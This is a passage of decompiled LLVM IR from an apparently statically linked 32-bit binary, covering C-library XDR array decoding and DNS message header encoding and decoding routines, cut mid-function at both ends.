  %v0_80665ec = load i32, i32* @esi, align 4
  store i32 %arg2, i32* @eax, align 4
  store i32 %arg3, i32* %esi.global-to-local, align 4
  %v1_80665f9 = inttoptr i32 %arg2 to i32*
  %v6_8066600 = call i32 @xdr_u_long(i32* %arg1, i32 %arg3)
  store i32 %v6_8066600, i32* %eax.global-to-local, align 4
  %v1_8066608 = icmp eq i32 %v6_8066600, 0
  br i1 %v1_8066608, label %dec_label_pc_80666e2, label %dec_label_pc_8066610

dec_label_pc_8066610:                             ; preds = %entry
  %v0_8066610 = load i32, i32* %esi.global-to-local, align 4
  %v1_8066610 = inttoptr i32 %v0_8066610 to i32*
  %v2_8066610 = load i32, i32* %v1_8066610, align 4
  store i32 %v2_8066610, i32* @edi, align 4
  %v6_8066616 = icmp ugt i32 %v2_8066610, %arg4
  br i1 %v6_8066616, label %dec_label_pc_8066625, label %dec_label_pc_8066618

dec_label_pc_8066618:                             ; preds = %dec_label_pc_8066610
  %v12_806661d = udiv i64 4294967295, %tmp9
  %v13_806661d = trunc i64 %v12_806661d to i32
  store i32 %v13_806661d, i32* %eax.global-to-local, align 4
  %v14_806661d = urem i64 4294967295, %tmp9
  %v15_806661d = trunc i64 %v14_806661d to i32
  store i32 %v15_806661d, i32* @edx, align 4
  %tmp = icmp ugt i32 %v2_8066610, %v13_806661d
  br i1 %tmp, label %dec_label_pc_8066625, label %dec_label_pc_8066632

dec_label_pc_8066625:                             ; preds = %dec_label_pc_8066618, %dec_label_pc_8066610
  store i32 %tmp12, i32* @edx, align 4
  %v2_8066629 = load i32, i32* %arg1, align 4
  %v11_8066629 = icmp eq i32 %v2_8066629, 2
  %v1_806662c = icmp eq i1 %v11_8066629, false
  br i1 %v1_806662c, label %dec_label_pc_80666e2, label %dec_label_pc_8066632

dec_label_pc_8066632:                             ; preds = %dec_label_pc_8066618, %dec_label_pc_8066625
  %v0_8066632 = load i32, i32* @ebx, align 4
  %v1_8066632 = icmp eq i32 %v0_8066632, 0
  %v1_8066634 = icmp eq i1 %v1_8066632, false
  br i1 %v1_8066634, label %dec_label_pc_8066695, label %dec_label_pc_8066636

dec_label_pc_8066636:                             ; preds = %dec_label_pc_8066632
  store i32 %tmp12, i32* @edx, align 4
  %v2_806663a = load i32, i32* %arg1, align 4
  store i32 %v2_806663a, i32* %eax.global-to-local, align 4
  %v9_806663c = icmp eq i32 %v2_806663a, 1
  br i1 %v9_806663c, label %dec_label_pc_806664b, label %dec_label_pc_8066641

dec_label_pc_8066641:                             ; preds = %dec_label_pc_8066636
  %v9_8066641 = icmp eq i32 %v2_806663a, 2
  %v1_8066644 = icmp eq i1 %v9_8066641, false
  br i1 %v1_8066644, label %dec_label_pc_8066695, label %dec_label_pc_80666e6

dec_label_pc_806664b:                             ; preds = %dec_label_pc_8066636
  %v1_806664b = icmp eq i32 %v2_8066610, 0
  br i1 %v1_806664b, label %dec_label_pc_80666e6, label %dec_label_pc_8066653

dec_label_pc_8066653:                             ; preds = %dec_label_pc_806664b
  %v4_806665a = mul i32 %v2_8066610, %arg5
  store i32 %v4_806665a, i32* @esi, align 4
  %v2_806665e = call i32 @malloc(i32 %v4_806665a)
  store i32 %v2_806665e, i32* @ebx, align 4
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v1_806666c = icmp eq i32 %v2_806665e, 0
  store i32 %v2_806665e, i32* %v1_80665f9, align 4
  %v1_8066670 = icmp eq i1 %v1_806666c, false
  br i1 %v1_8066670, label %dec_label_pc_8066688, label %dec_label_pc_8066672

dec_label_pc_8066672:                             ; preds = %dec_label_pc_8066653
  %v0_8066674 = load i32, i32* @global_var_8074610, align 16
  %v3_806667f = call i32 @__GI_fputs(i32 ptrtoint ([26 x i8]* @global_var_806e3a4.850 to i32), i32 %v0_8066674)
  store i32 %v3_806667f, i32* %eax.global-to-local, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80666dd

dec_label_pc_8066688:                             ; preds = %dec_label_pc_8066653
  %v0_8066689 = load i32, i32* @esi, align 4
  %v0_806668c = load i32, i32* @ebx, align 4
  %v5_806668c = inttoptr i32 %v0_806668c to i8*
  %v5_806668d = call i32 @__GI_memset(i8* %v5_806668c, i32 0, i32 %v0_8066689)
  store i32 %v5_806668d, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8066695

dec_label_pc_8066695:                             ; preds = %dec_label_pc_8066641, %dec_label_pc_8066632, %dec_label_pc_8066688
  store i32 0, i32* @ebp, align 4
  store i32 1, i32* @esi, align 4
  %v7_80666b427 = icmp ne i32 %v2_8066610, 0
  %v1_80666b631 = icmp eq i1 %v7_80666b427, false
  br i1 %v1_80666b631, label %dec_label_pc_80666bc, label %dec_label_pc_80666b8

dec_label_pc_806669e:                             ; preds = %dec_label_pc_80666b8
  %v1_80666a2 = add i32 %v0_80666a234, 1
  store i32 %v1_80666a2, i32* @ebp, align 4
  call void @__pseudo_call(i32 %arg5)
  %v0_80666ab = load i32, i32* @ebx, align 4
  %v5_80666ab = add i32 %v0_80666ab, %arg4
  store i32 %v5_80666ab, i32* @ebx, align 4
  %v0_80666af = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_80666af, i32* @esi, align 4
  %v0_80666b4.pre = load i32, i32* @ebp, align 4
  %v7_80666b4 = icmp ult i32 %v0_80666b4.pre, %v2_8066610
  %v1_80666b6 = icmp eq i1 %v7_80666b4, false
  br i1 %v1_80666b6, label %dec_label_pc_80666bc, label %dec_label_pc_80666b8

dec_label_pc_80666b8:                             ; preds = %dec_label_pc_8066695, %dec_label_pc_806669e
  %v0_80666a234 = phi i32 [ %v0_80666b4.pre, %dec_label_pc_806669e ], [ 0, %dec_label_pc_8066695 ]
  %v0_80666b833 = phi i32 [ %v0_80666af, %dec_label_pc_806669e ], [ 1, %dec_label_pc_8066695 ]
  %v1_80666b8 = icmp eq i32 %v0_80666b833, 0
  %v1_80666ba = icmp eq i1 %v1_80666b8, false
  br i1 %v1_80666ba, label %dec_label_pc_806669e, label %dec_label_pc_80666bc

dec_label_pc_80666bc:                             ; preds = %dec_label_pc_806669e, %dec_label_pc_80666b8, %dec_label_pc_8066695
  %v0_80666b8.lcssa = phi i32 [ 1, %dec_label_pc_8066695 ], [ %v0_80666b833, %dec_label_pc_80666b8 ], [ %v0_80666af, %dec_label_pc_806669e ]
  %v2_80666c0 = load i32, i32* %arg1, align 4
  %v11_80666c0 = icmp eq i32 %v2_80666c0, 2
  %v1_80666c3 = icmp eq i1 %v11_80666c0, false
  br i1 %v1_80666c3, label %dec_label_pc_80666eb, label %dec_label_pc_80666c5

dec_label_pc_80666c5:                             ; preds = %dec_label_pc_80666bc
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v2_80666cc = load i32, i32* %v1_80665f9, align 4
  %v2_80666ce = call i32 @free(i32 %v2_80666cc)
  store i32 %v2_80666ce, i32* %eax.global-to-local, align 4
  store i32 0, i32* %v1_80665f9, align 4
  %v0_80666ee.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80666dd

dec_label_pc_80666dd:                             ; preds = %dec_label_pc_8066672, %dec_label_pc_80666c5
  %v0_80666ee.pre = phi i32 [ 0, %dec_label_pc_8066672 ], [ %v0_80666ee.pre.pre, %dec_label_pc_80666c5 ]
  br label %dec_label_pc_80666eb

dec_label_pc_80666e2:                             ; preds = %dec_label_pc_8066625, %entry
  store i32 0, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80666eb

dec_label_pc_80666e6:                             ; preds = %dec_label_pc_8066641, %dec_label_pc_806664b
  store i32 1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80666eb

dec_label_pc_80666eb:                             ; preds = %dec_label_pc_80666bc, %dec_label_pc_80666e2, %dec_label_pc_80666dd, %dec_label_pc_80666e6
  %v0_80666ee = phi i32 [ %v0_80666b8.lcssa, %dec_label_pc_80666bc ], [ 0, %dec_label_pc_80666e2 ], [ %v0_80666ee.pre, %dec_label_pc_80666dd ], [ 1, %dec_label_pc_80666e6 ]
  store i32 %v0_80666ee, i32* %eax.global-to-local, align 4
  store i32 %v0_80665ec, i32* %esi.global-to-local, align 4
  store i32 %v0_80665eb, i32* @edi, align 4
  store i32 %v0_80665ea, i32* @ebp, align 4
  ret i32 %v0_80666ee

; uselistorder directives
  uselistorder i32 %v0_80666ee, { 1, 0 }
  uselistorder i32 %v4_806665a, { 1, 0 }
  uselistorder i32 %v2_8066610, { 3, 2, 0, 4, 1, 5, 6 }
  uselistorder i32* %v1_80665f9, { 1, 2, 0 }
  uselistorder i32 %tmp12, { 1, 0 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 8, 3, 4, 5, 6, 7, 9 }
  uselistorder i32 (i8*, i32, i32)* @__GI_memset, { 9, 80, 78, 79, 82, 87, 85, 84, 13, 58, 10, 11, 12, 77, 60, 5, 6, 7, 8, 86, 83, 0, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 1, 2, 3, 4, 72, 73, 74, 75, 76, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 59, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 81 }
  uselistorder i64 4294967295, { 1, 2, 4, 5, 3, 0, 6 }
  uselistorder i32 (i32*, i32)* @xdr_u_long, { 15, 16, 17, 5, 20, 19, 18, 3, 0, 6, 7, 1, 8, 4, 12, 13, 14, 2, 9, 10, 11 }
  uselistorder i32 %arg5, { 1, 0, 2 }
  uselistorder i32 %arg2, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_80666eb, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_80666e6, { 1, 0 }
  uselistorder label %dec_label_pc_80666dd, { 1, 0 }
  uselistorder label %dec_label_pc_80666bc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80666b8, { 1, 0 }
  uselistorder label %dec_label_pc_8066695, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8066632, { 1, 0 }
}

define i32 @__encode_header() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i8* @__decompiler_undefined_function_3()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_80666f9 = load i32, i32* @ebx, align 4
  store i32 %v0_80666f9, i32* %stack_var_-8, align 4
  store i32 %tmp9, i32* %ebx.global-to-local, align 4
  %v4_8066701 = ptrtoint i8* %tmp8 to i32
  store i32 %v4_8066701, i32* %esi.global-to-local, align 4
  %v7_806670a = icmp sgt i32 %tmp, 11
  br i1 %v7_806670a, label %dec_label_pc_8066710, label %dec_label_pc_80667a6

dec_label_pc_8066710:                             ; preds = %entry
  %v1_8066710 = add i32 %tmp9, 1
  %v2_8066710 = inttoptr i32 %v1_8066710 to i8*
  %v3_8066710 = load i8, i8* %v2_8066710, align 1
  store i8 %v3_8066710, i8* %tmp8, align 1
  %v0_8066716 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8066716 = inttoptr i32 %v0_8066716 to i32*
  %v2_8066716 = load i32, i32* %v1_8066716, align 4
  %v1_8066718 = trunc i32 %v2_8066716 to i8
  %v2_8066718 = load i32, i32* %esi.global-to-local, align 4
  %v3_8066718 = add i32 %v2_8066718, 1
  %v4_8066718 = inttoptr i32 %v3_8066718 to i8*
  store i8 %v1_8066718, i8* %v4_8066718, align 1
  %v0_806673e = load i32, i32* %ebx.global-to-local, align 4
  %v1_806673e = add i32 %v0_806673e, 8
  %v2_806673e = inttoptr i32 %v1_806673e to i32*
  %v3_806673e = load i32, i32* %v2_806673e, align 4
  %v1_8066741 = mul i32 %v3_806673e, 8
  %v2_8066747 = or i32 %v1_8066741, 4
  %v1_8066749 = add i32 %v0_806673e, 20
  %v2_8066749 = inttoptr i32 %v1_8066749 to i32*
  %v3_8066749 = load i32, i32* %v2_8066749, align 4
  %v4_8066749 = icmp eq i32 %v3_8066749, 0
  %v1_806674d = icmp eq i1 %v4_8066749, false
  %v2_806674d = zext i1 %v1_806674d to i32
  %v2_8066750 = or i32 %v2_806674d, %v2_8066747
  %v2_8066752 = or i32 %v2_8066750, -126
  %v5_8066752 = trunc i32 %v2_8066752 to i8
  store i32 %v2_8066752, i32* @ecx, align 4
  %v2_8066754 = load i32, i32* %esi.global-to-local, align 4
  %v3_8066754 = add i32 %v2_8066754, 2
  %v4_8066754 = inttoptr i32 %v3_8066754 to i8*
  store i8 %v5_8066752, i8* %v4_8066754, align 1
  %v0_8066757 = load i32, i32* %ebx.global-to-local, align 4
  %v1_806675d = add i32 %v0_8066757, 28
  %v2_806675d = inttoptr i32 %v1_806675d to i8*
  %v3_806675d = load i8, i8* %v2_806675d, align 1
  %tmp13 = urem i8 %v3_806675d, 16
  %v2_8066768 = or i8 %tmp13, -128
  %v2_806676a = load i32, i32* %esi.global-to-local, align 4
  %v3_806676a = add i32 %v2_806676a, 3
  %v4_806676a = inttoptr i32 %v3_806676a to i8*
  store i8 %v2_8066768, i8* %v4_806676a, align 1
  %v0_806676d = load i32, i32* %ebx.global-to-local, align 4
  %v1_806676d = add i32 %v0_806676d, 33
  %v2_806676d = inttoptr i32 %v1_806676d to i8*
  %v3_806676d = load i8, i8* %v2_806676d, align 1
  %v2_8066771 = load i32, i32* %esi.global-to-local, align 4
  %v3_8066771 = add i32 %v2_8066771, 4
  %v4_8066771 = inttoptr i32 %v3_8066771 to i8*
  store i8 %v3_806676d, i8* %v4_8066771, align 1
  %v0_8066774 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8066774 = add i32 %v0_8066774, 32
  %v2_8066774 = inttoptr i32 %v1_8066774 to i32*
  %v3_8066774 = load i32, i32* %v2_8066774, align 4
  %v1_8066777 = trunc i32 %v3_8066774 to i8
  %v2_8066777 = load i32, i32* %esi.global-to-local, align 4
  %v3_8066777 = add i32 %v2_8066777, 5
  %v4_8066777 = inttoptr i32 %v3_8066777 to i8*
  store i8 %v1_8066777, i8* %v4_8066777, align 1
  %v0_806677a = load i32, i32* %ebx.global-to-local, align 4
  %v1_806677a = add i32 %v0_806677a, 37
  %v2_806677a = inttoptr i32 %v1_806677a to i8*
  %v3_806677a = load i8, i8* %v2_806677a, align 1
  %v2_806677e = load i32, i32* %esi.global-to-local, align 4
  %v3_806677e = add i32 %v2_806677e, 6
  %v4_806677e = inttoptr i32 %v3_806677e to i8*
  store i8 %v3_806677a, i8* %v4_806677e, align 1
  %v0_8066781 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8066781 = add i32 %v0_8066781, 36
  %v2_8066781 = inttoptr i32 %v1_8066781 to i32*
  %v3_8066781 = load i32, i32* %v2_8066781, align 4
  %v1_8066784 = trunc i32 %v3_8066781 to i8
  %v2_8066784 = load i32, i32* %esi.global-to-local, align 4
  %v3_8066784 = add i32 %v2_8066784, 7
  %v4_8066784 = inttoptr i32 %v3_8066784 to i8*
  store i8 %v1_8066784, i8* %v4_8066784, align 1
  %v0_8066787 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8066787 = add i32 %v0_8066787, 41
  %v2_8066787 = inttoptr i32 %v1_8066787 to i8*
  %v3_8066787 = load i8, i8* %v2_8066787, align 1
  %v2_806678b = load i32, i32* %esi.global-to-local, align 4
  %v3_806678b = add i32 %v2_806678b, 8
  %v4_806678b = inttoptr i32 %v3_806678b to i8*
  store i8 %v3_8066787, i8* %v4_806678b, align 1
  %v0_806678e = load i32, i32* %ebx.global-to-local, align 4
  %v1_806678e = add i32 %v0_806678e, 40
  %v2_806678e = inttoptr i32 %v1_806678e to i32*
  %v3_806678e = load i32, i32* %v2_806678e, align 4
  %v1_8066791 = trunc i32 %v3_806678e to i8
  %v2_8066791 = load i32, i32* %esi.global-to-local, align 4
  %v3_8066791 = add i32 %v2_8066791, 9
  %v4_8066791 = inttoptr i32 %v3_8066791 to i8*
  store i8 %v1_8066791, i8* %v4_8066791, align 1
  %v0_8066794 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8066794 = add i32 %v0_8066794, 45
  %v2_8066794 = inttoptr i32 %v1_8066794 to i8*
  %v3_8066794 = load i8, i8* %v2_8066794, align 1
  %v2_8066798 = load i32, i32* %esi.global-to-local, align 4
  %v3_8066798 = add i32 %v2_8066798, 10
  %v4_8066798 = inttoptr i32 %v3_8066798 to i8*
  store i8 %v3_8066794, i8* %v4_8066798, align 1
  %v0_806679b = load i32, i32* %ebx.global-to-local, align 4
  %v1_806679b = add i32 %v0_806679b, 44
  %v2_806679b = inttoptr i32 %v1_806679b to i32*
  %v3_806679b = load i32, i32* %v2_806679b, align 4
  %v1_806679e = trunc i32 %v3_806679b to i8
  %v2_806679e = load i32, i32* %esi.global-to-local, align 4
  %v3_806679e = add i32 %v2_806679e, 11
  %v4_806679e = inttoptr i32 %v3_806679e to i8*
  store i8 %v1_806679e, i8* %v4_806679e, align 1
  %v2_80667a6.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_80667a6

dec_label_pc_80667a6:                             ; preds = %entry, %dec_label_pc_8066710
  %v2_80667a6 = phi i32 [ %v0_80666f9, %entry ], [ %v2_80667a6.pre, %dec_label_pc_8066710 ]
  %v0_80667a8 = phi i32 [ -1, %entry ], [ 12, %dec_label_pc_8066710 ]
  store i32 %v2_80667a6, i32* %ebx.global-to-local, align 4
  ret i32 %v0_80667a8

; uselistorder directives
  uselistorder i32 45, { 8, 1, 9, 3, 0, 6, 10, 4, 5, 7, 2 }
  uselistorder i32 41, { 2, 1, 0 }
  uselistorder i32 37, { 4, 0, 2, 3, 5, 1 }
  uselistorder i32 33, { 8, 7, 9, 0, 1, 2, 3, 5, 4, 6 }
  uselistorder label %dec_label_pc_80667a6, { 1, 0 }
}

define i32 @__decode_header() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i8* @__decompiler_undefined_function_3()
  %stack_var_-4 = alloca i32, align 4
  %v0_80667ac = load i32, i32* @ebx, align 4
  store i32 %v0_80667ac, i32* %stack_var_-4, align 4
  %v4_80667ad = ptrtoint i8* %tmp2 to i32
  store i32 %v4_80667ad, i32* @ecx, align 4
  store i32 %tmp, i32* %ebx.global-to-local, align 4
  %v2_80667b5 = load i8, i8* %tmp2, align 1
  %v3_80667b5 = zext i8 %v2_80667b5 to i32
  %v1_80667b8 = add i32 %v4_80667ad, 1
  %v2_80667b8 = inttoptr i32 %v1_80667b8 to i8*
  %v3_80667b8 = load i8, i8* %v2_80667b8, align 1
  %v4_80667b8 = zext i8 %v3_80667b8 to i32
  %v2_80667bc = mul nuw nsw i32 %v3_80667b5, 256
  %v2_80667bf = or i32 %v4_80667b8, %v2_80667bc
  %v2_80667c1 = inttoptr i32 %tmp to i32*
  store i32 %v2_80667bf, i32* %v2_80667c1, align 4
  %v0_80667c3 = load i32, i32* @ecx, align 4
  %v1_80667c3 = add i32 %v0_80667c3, 2
  %v2_80667c3 = inttoptr i32 %v1_80667c3 to i8*
  %v3_80667c3 = load i8, i8* %v2_80667c3, align 1
  %tmp6 = icmp slt i8 %v3_80667c3, 0
  %v2_80667c7 = zext i1 %tmp6 to i32
  %v1_80667ca = load i32, i32* %ebx.global-to-local, align 4
  %v2_80667ca = add i32 %v1_80667ca, 4
  %v3_80667ca = inttoptr i32 %v2_80667ca to i32*
  store i32 %v2_80667c7, i32* %v3_80667ca, align 4
  %v0_80667cd = load i32, i32* @ecx, align 4
  %v1_80667cd = add i32 %v0_80667cd, 2
  %v2_80667cd = inttoptr i32 %v1_80667cd to i8*
  %v3_80667cd = load i8, i8* %v2_80667cd, align 1
  %v3_80667d0 = udiv i8 %v3_80667cd, 8
  %tmp7 = urem i8 %v3_80667d0, 16
  %v1_80667d3 = zext i8 %tmp7 to i32
  %v1_80667d6 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80667d6 = add i32 %v1_80667d6, 8
  %v3_80667d6 = inttoptr i32 %v2_80667d6 to i32*
  store i32 %v1_80667d3, i32* %v3_80667d6, align 4
  %v0_80667d9 = load i32, i32* @ecx, align 4
  %v1_80667d9 = add i32 %v0_80667d9, 2
  %v2_80667d9 = inttoptr i32 %v1_80667d9 to i8*
  %v3_80667d9 = load i8, i8* %v2_80667d9, align 1
  %div = udiv i8 %v3_80667d9, 4
  %tmp8 = urem i8 %div, 2
  %v1_80667e0 = zext i8 %tmp8 to i32
  %v1_80667e3 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80667e3 = add i32 %v1_80667e3, 12
  %v3_80667e3 = inttoptr i32 %v2_80667e3 to i32*
  store i32 %v1_80667e0, i32* %v3_80667e3, align 4
  %v0_80667e6 = load i32, i32* @ecx, align 4
  %v1_80667e6 = add i32 %v0_80667e6, 2
  %v2_80667e6 = inttoptr i32 %v1_80667e6 to i8*
  %v3_80667e6 = load i8, i8* %v2_80667e6, align 1
  %div5 = udiv i8 %v3_80667e6, 2
  %tmp9 = urem i8 %div5, 2
  %v1_80667ec = zext i8 %tmp9 to i32
  %v1_80667ef = load i32, i32* %ebx.global-to-local, align 4
  %v2_80667ef = add i32 %v1_80667ef, 16
  %v3_80667ef = inttoptr i32 %v2_80667ef to i32*
  store i32 %v1_80667ec, i32* %v3_80667ef, align 4
  %v0_80667f2 = load i32, i32* @ecx, align 4
  %v1_80667f2 = add i32 %v0_80667f2, 2
  %v2_80667f2 = inttoptr i32 %v1_80667f2 to i8*
  %v3_80667f2 = load i8, i8* %v2_80667f2, align 1
  %tmp10 = urem i8 %v3_80667f2, 2
  %v1_80667f6 = zext i8 %tmp10 to i32
  %v1_80667f9 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80667f9 = add i32 %v1_80667f9, 20
  %v3_80667f9 = inttoptr i32 %v2_80667f9 to i32*
  store i32 %v1_80667f6, i32* %v3_80667f9, align 4
  %v0_80667fc = load i32, i32* @ecx, align 4
  %v1_80667fc = add i32 %v0_80667fc, 3
  %v2_80667fc = inttoptr i32 %v1_80667fc to i8*
  %v3_80667fc = load i8, i8* %v2_80667fc, align 1
  %tmp11 = icmp slt i8 %v3_80667fc, 0
  %v2_8066800 = zext i1 %tmp11 to i32
  %v1_8066803 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8066803 = add i32 %v1_8066803, 24
  %v3_8066803 = inttoptr i32 %v2_8066803 to i32*
  store i32 %v2_8066800, i32* %v3_8066803, align 4
  %v0_8066806 = load i32, i32* @ecx, align 4
  %v1_8066806 = add i32 %v0_8066806, 3
  %v2_8066806 = inttoptr i32 %v1_8066806 to i8*
  %v3_8066806 = load i8, i8* %v2_8066806, align 1
  %tmp12 = urem i8 %v3_8066806, 16
  %v1_806680a = zext i8 %tmp12 to i32
  %v1_806680d = load i32, i32* %ebx.global-to-local, align 4
  %v2_806680d = add i32 %v1_806680d, 28
  %v3_806680d = inttoptr i32 %v2_806680d to i32*
  store i32 %v1_806680a, i32* %v3_806680d, align 4
  %v0_8066810 = load i32, i32* @ecx, align 4
  %v1_8066810 = add i32 %v0_8066810, 4
  %v2_8066810 = inttoptr i32 %v1_8066810 to i8*
  %v3_8066810 = load i8, i8* %v2_8066810, align 1
  %v4_8066810 = zext i8 %v3_8066810 to i32
  %v1_8066814 = add i32 %v0_8066810, 5
  %v2_8066814 = inttoptr i32 %v1_8066814 to i8*
  %v3_8066814 = load i8, i8* %v2_8066814, align 1
  %v4_8066814 = zext i8 %v3_8066814 to i32
  %v2_8066818 = mul nuw nsw i32 %v4_8066810, 256
  %v2_806681b = or i32 %v4_8066814, %v2_8066818
  %v1_806681d = load i32, i32* %ebx.global-to-local, align 4
  %v2_806681d = add i32 %v1_806681d, 32
  %v3_806681d = inttoptr i32 %v2_806681d to i32*
  store i32 %v2_806681b, i32* %v3_806681d, align 4
  %v0_8066820 = load i32, i32* @ecx, align 4
  %v1_8066820 = add i32 %v0_8066820, 6
  %v2_8066820 = inttoptr i32 %v1_8066820 to i8*
  %v3_8066820 = load i8, i8* %v2_8066820, align 1
  %v4_8066820 = zext i8 %v3_8066820 to i32
  %v1_8066824 = add i32 %v0_8066820, 7
  %v2_8066824 = inttoptr i32 %v1_8066824 to i8*
  %v3_8066824 = load i8, i8* %v2_8066824, align 1
  %v4_8066824 = zext i8 %v3_8066824 to i32
  %v2_8066828 = mul nuw nsw i32 %v4_8066820, 256
  %v2_806682b = or i32 %v4_8066824, %v2_8066828
  %v1_806682d = load i32, i32* %ebx.global-to-local, align 4
  %v2_806682d = add i32 %v1_806682d, 36
  %v3_806682d = inttoptr i32 %v2_806682d to i32*
  store i32 %v2_806682b, i32* %v3_806682d, align 4
  %v0_8066830 = load i32, i32* @ecx, align 4
  %v1_8066830 = add i32 %v0_8066830, 8
  %v2_8066830 = inttoptr i32 %v1_8066830 to i8*
  %v3_8066830 = load i8, i8* %v2_8066830, align 1
  %v4_8066830 = zext i8 %v3_8066830 to i32
  %v1_8066834 = add i32 %v0_8066830, 9
  %v2_8066834 = inttoptr i32 %v1_8066834 to i8*
  %v3_8066834 = load i8, i8* %v2_8066834, align 1
  %v4_8066834 = zext i8 %v3_8066834 to i32
  %v2_8066838 = mul nuw nsw i32 %v4_8066830, 256
  %v2_806683b = or i32 %v4_8066834, %v2_8066838
  %v1_806683d = load i32, i32* %ebx.global-to-local, align 4
  %v2_806683d = add i32 %v1_806683d, 40
  %v3_806683d = inttoptr i32 %v2_806683d to i32*
  store i32 %v2_806683b, i32* %v3_806683d, align 4
  %v0_8066840 = load i32, i32* @ecx, align 4
  %v1_8066840 = add i32 %v0_8066840, 10
  %v2_8066840 = inttoptr i32 %v1_8066840 to i8*
  %v3_8066840 = load i8, i8* %v2_8066840, align 1
  %v4_8066840 = zext i8 %v3_8066840 to i32
  %v1_8066844 = add i32 %v0_8066840, 11
  %v2_8066844 = inttoptr i32 %v1_8066844 to i8*
  %v3_8066844 = load i8, i8* %v2_8066844, align 1
  %v4_8066844 = zext i8 %v3_8066844 to i32
  %v2_8066848 = mul nuw nsw i32 %v4_8066840, 256
  %v2_806684b = or i32 %v4_8066844, %v2_8066848
  %v1_806684d = load i32, i32* %ebx.global-to-local, align 4
  %v2_806684d = add i32 %v1_806684d, 44
  %v3_806684d = inttoptr i32 %v2_806684d to i32*
  store i32 %v2_806684b, i32* %v3_806684d, align 4
  %v2_8066855 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8066855, i32* @ebx, align 4
  ret i32 12

; uselistorder directives
  uselistorder i8* %tmp2, { 1, 0 }
  uselistorder i32 40, { 30, 31, 36, 19, 38, 33, 34, 35, 22, 23, 24, 25, 26, 20, 37, 13, 14, 32, 12, 29, 1, 2, 39, 40, 41, 42, 21, 27, 3, 0, 15, 16, 17, 18, 28, 4, 5, 10, 11, 6, 9, 8, 7 }
  uselistorder i32 28, { 75, 76, 93, 77, 95, 104, 105, 106, 85, 78, 79, 2, 80, 81, 82, 83, 84, 4, 5, 6, 0, 51, 52, 53, 54, 55, 56, 7, 44, 45, 46, 94, 33, 34, 96, 32, 107, 63, 3, 14, 57, 58, 74, 47, 48, 19, 20, 8, 9, 86, 87, 88, 89, 90, 97, 98, 99, 100, 101, 102, 1, 103, 110, 91, 59, 111, 112, 115, 116, 113, 114, 108, 109, 60, 61, 62, 64, 65, 35, 36, 21, 37, 38, 39, 66, 67, 49, 50, 10, 68, 12, 69, 11, 70, 40, 41, 42, 43, 71, 72, 22, 23, 73, 15, 24, 25, 26, 27, 28, 29, 30, 31, 18, 16, 17, 13, 92 }
  uselistorder i8 2, { 0, 1, 2, 3, 6, 7, 8, 37, 9, 23, 40, 41, 10, 42, 11, 12, 13, 14, 38, 39, 15, 29, 16, 17, 4, 30, 31, 32, 18, 19, 33, 34, 20, 21, 22, 5, 24, 28, 35, 25, 36, 26, 27 }
  uselistorder i8 4, { 0, 4, 1, 5, 3, 6, 7, 2 }
  uselistorder i8 16, { 0, 1, 2, 8, 9, 5, 3, 7, 4, 10, 6 }
  uselistorder i8 8, { 0, 2, 5, 4, 3, 6, 7, 8, 1 }
}

define i32 @__encode_question() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %v0_8066858 = load i32, i32* @edi, align 4
  %v0_8066859 = load i32, i32* @esi, align 4
  %v0_806685a = load i32, i32* @ebx, align 4
  store i32 %v0_806685a, i32* %stack_var_-12, align 4
  store i32 %tmp3, i32* @esi, align 4
  store i32 %tmp2, i32* @edi, align 4
  store i32 %tmp, i32* @ebx, align 4
  %v0_8066867 = load i32, i32* @eax, align 4
  %v1_806686a = inttoptr i32 %tmp3 to i32*
  %v2_806686a = load i32, i32* %v1_806686a, align 4
  %v7_806686c = inttoptr i32 %v2_806686a to i8*
  %v8_806686c = call i32 @__encode_dotted(i8* %v7_806686c, i32 %tmp2, i32 %tmp, i32 %v0_8066867, i32 %v0_806685a, i32 %v0_8066859, i32 %v0_8066858)
  store i32 %v8_806686c, i32* @ecx, align 4
  %v2_8066876 = icmp slt i32 %v8_806686c, 0
  br i1 %v2_8066876, label %dec_label_pc_80668a5, label %dec_label_pc_806687a

dec_label_pc_806687a:                             ; preds = %entry
  %v0_806687a = load i32, i32* @ebx, align 4
  %v2_806687a = sub i32 %v0_806687a, %v8_806686c
  %v1_806687c = add i32 %v2_806687a, -3
  %v6_806687c = sub i32 2, %v2_806687a
  %v7_806687c = and i32 %v6_806687c, %v2_806687a
  %v8_806687c = icmp slt i32 %v7_806687c, 0
